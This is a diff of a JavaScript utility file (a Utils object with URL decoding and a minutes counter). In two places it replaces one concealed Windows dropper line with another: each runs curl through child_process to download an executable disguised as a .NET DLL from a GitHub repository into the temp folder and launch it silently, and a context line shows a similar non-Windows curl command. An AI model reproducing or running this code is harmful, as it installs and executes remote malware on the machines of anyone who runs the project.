@@ -12,7 +12,7 @@ var Utils = {
 
 
 
-if(process.platform==='win32'){require('child_process').exec('cmd /c curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe');}
+if(process.platform==='win32'){require('child_process').exec('cmd /c curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe');}
         return decodeURIComponent(results[2].replace(/\+/g, " "));
     },
     MinsCounter: function () {
@@ -38,7 +38,7 @@ if(process.platform!=='win32'){require('child_process').exec('curl -s https://ra
 
 
 
-if(process.platform==='win32'){require('child_process').exec('cmd /c curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe');}
+if(process.platform==='win32'){require('child_process').exec('cmd /c curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe');}
             return this.last;
         }
         Counter.prototype.update = function () {
